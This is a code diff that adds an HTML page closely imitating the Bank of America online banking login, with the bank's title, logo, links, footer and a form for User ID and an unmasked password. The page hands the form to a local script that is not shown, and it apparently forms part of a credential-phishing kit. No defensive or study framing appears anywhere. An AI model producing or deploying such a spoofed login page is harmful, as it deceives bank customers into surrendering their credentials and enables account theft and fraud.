@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Of America | Online Banking | Log In | User ID</title>
+    <link rel="stylesheet" href="./dashboard/output.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100;0,300;0,400;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Poppins', sans-serif;
+            /* font-family: 'Roboto', sans-serif; */
+        }
+    </style>
+</head>
+<body class="flex justify-center items-start">
+    <div class="container lg:w-[960px]">
+        <div class="p-[20px] flex justify-between flex-col sm:flex-row">
+            <div class="flex justify-between items-center">
+                <img src="./dashboard/assets/boa_mainlogo.png" width="230" height="28" alt="logo">
+                <h3 class="ml-[25px] text-[#837361] lg:text-[20px] text-sm">Log In</h3>
+            </div>
+            <div class="flex justify-between items-center">
+                <div class="flex items-center mr-[10px]">
+                    <span class="overflow-hidden">
+                        <img class="mb-[-1.2rem] mr-2" src="./dashboard/assets/lock.png" alt="">
+                    </span>
+                    <h3 class="text-[12px] text-[#313131] font-bold">Secure Area</h3>
+                </div>
+                <div class="flex items-center ml-[10px] overflow-hidden">
+                    <img class="mt-[-1.2rem] mr-2" src="./dashboard/assets/lock.png" alt="">
+                    <a target="_blank" href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US" class="text-[#666] text-[11px]">En español</a>
+                </div>
+            </div>
+        </div>
+        <div class="p-[20px] bg-[#dc1431]">
+            <h1 class="text-[20px] text-white">Log In to Online Banking</h1>
+        </div>
+
+        <!-- Beginning of Middle Section -->
+
+        <div class="flex flex-col sm:flex-wrap lg:flex-row">
+            <div class="px-[25px]">
+                <form class="border-r-[1px] border-gray-300 pr-24">
+                    <div class="my-14">
+                        <label class="text-[18px]" for="userId">User ID</label>
+                        <input name="userId" class="block border-[#ccc] border-[1px] border-solid my-1 min-w-[215px]" type="text" />
+                        <div class="flex items-center">
+                            <input type="checkbox" />
+                            <p class="ml-2 text-gray-600 text-sm">Save this User ID</p>
+                            <img src="./dashboard/assets/help.png" class="hover:opacity-50 hover:cursor-pointer ml-2" width="18" height="8" alt="">
+                        </div>
+                    </div>
+                    <div class="my-12">
+                        <label class="text-[18px]" for="userId">Password</label>
+                        <input name="password" class="block border-[#ccc] border-[1px] border-solid my-1 min-w-[215px] mb-[24px]" type="text" />
+                        <a target="_blank" href="https://secure.bankofamerica.com/auth/forgot/reset-entry/" class="text-[#3366cc] text-[12px] hover:underline">Forgot your Password?</a>
+                        <button type="submit" class="btn-login overflow-hidden flex py-[1px] px-[14px] text-white h-[25px] mt-6">
+                            <img class="mr-2 mt-[-2px]" src="./dashboard/assets/lock-login.png" alt="">
+                            Log In
+                        </button>
+                    </div>
+                </form>
+            </div>
+            <div class="mt-12 ml-4">
+                <div class="mb-2">
+                    <h4 class="text-[14px] text-gray-600">Stay connected with our app</h4>
+                </div>
+                <div class="flex items-center">
+                    <img src="./dashboard/assets/mobile_frame.png" width="149" height="208" alt="">
+                    <div class="ml-2">
+                        <h4 class="text-[14px] text-gray-600">Secure, convenient <br />banking anytime</h4>
+                        <button class="w-[118.41px] h-[36px] py-[5px] rounded-md mt-4 border-[#bb292b] text-white btn">Get the app</button>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-12 lg:ml-12 ml-4">
+                <div>
+                    <h2 class="text-[14px] text-gray-600">Login Help</h2>
+                    <div class="h-[1px] bg-gray-300 w-[12rem] my-3"></div>
+                    <ul>
+                        <li class="my-1"><a class="text-[#3366cc] text-[12px] hover:underline" href="https://secure.bankofamerica.com/auth/forgot/reset-entry/">Forgot ID/Password?</a></li>
+                        <li class="my-1"><a class="text-[#3366cc] text-[12px] hover:underline" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/">Problem logging in?</a></li>
+                    </ul>
+                </div>
+                <div class="mt-10">
+                    <h2 class="text-[14px] text-gray-600">Not using Online Banking?</h2>
+                    <div class="h-[1px] bg-gray-300 w-[12rem] my-3"></div>
+                    <ul>
+                        <li class="my-1"><a class="text-[#3366cc] text-[12px] hover:underline" href="https://secure.bankofamerica.com/auth/enroll/enroll-entry/">Enroll now</a></li>
+                        <li class="my-1"><a class="text-[#3366cc] text-[12px] hover:underline" href="bankofamerica.com/online-banking/mobile-and-online-banking-features/">Learn more about Online Banking</a></li>
+                        <li class="my-1"><a class="text-[#3366cc] text-[12px] hover:underline" href="https://www.bankofamerica.com/online-banking/service-agreement.go">Service Agreement</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- End of Middle Section -->
+
+        <div class="bg-[#f3efea] text-[11px] pt-[17px] pl-[17px] pr-[25px] pb-[45px]">
+            <div class="flex items-center mr-[10px]">
+                <span class="overflow-hidden">
+                    <img class="mb-[-1.2rem] mr-2" src="./dashboard/assets/lock.png" alt="">
+                </span>
+                <h3 class="text-[12px] text-[#313131] font-bold">Secure Area</h3>
+            </div>
+            <ul class="flex my-4">
+                <li class="mr-2"><a target="_blank" href="https://www.bankofamerica.com/security-center/privacy-overview/" class="text-blue-600">Privacy</a></li>
+                <li class="w-[2px] h-[0.9rem] bg-blue-400"></li>
+                <li class="mr-2 ml-2"><a target="_blank" href="https://www.bankofamerica.com/security-center/overview/" class="text-blue-600">Security</a></li>
+                <li class="w-[2px] h-[0.9rem] bg-blue-400"></li>
+                <li class="mr-2 ml-2"><a target="_blank" href="#" class="text-blue-600">CA Opt-Out Preference Signals Honored</a></li>
+            </ul>
+            <div class="w-full">
+                <div class="flex items-center ">
+                    <div class="text-gray-600">Bank of America, N.A. Member FDIC. </div>
+                    <a target="_blank" href="https://www.bankofamerica.com/help/equalhousing-popup/" class="text-blue-600 flex items-center ml-2">Equal Housing Lender <img src="./dashboard/assets/home-icon.png" alt="" class="ml-2 mb-1"></a>
+                </div>
+                <div class="text-gray-600">© 2023 Bank of America Corporation.</div> 
+            </div>
+        </div>
+    </div>
+    <script src="./dashboard/mainLogin.js"></script>
+</body>
+</html>
